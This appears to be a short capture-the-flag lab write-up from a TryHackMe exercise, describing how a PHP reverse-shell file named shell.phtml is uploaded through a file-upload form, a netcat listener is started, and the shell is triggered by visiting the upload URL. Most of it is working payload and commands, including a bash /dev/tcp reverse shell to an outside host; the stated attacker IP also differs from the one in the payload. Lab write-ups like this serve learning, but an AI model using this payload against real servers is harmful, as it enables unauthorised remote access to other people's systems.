# Setting up file payload file

```json
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.23.142.138/4444 0>&1'");
?>
```

I have saved this command in the following file: *shell.phtml*. The File Upload is working only with files with the following extension: *.phtml*.

*10.9.1.178*: The IP Address which is the one i have in the THM network.
*4444*: The port on which i will be receiving the terminal.

# Starting a listening service on my machine (Netcat)

```css
nc -lvnp 4444
```

![[Pasted image 20250813000234.png]]

# Uploading the file and executing it

I just simply select the file and then execute it by typing this in the url section: 

```css
10.10.76.39:3333/internal/uploads/shell.phtml
```

![[Pasted image 20250813000755.png]]

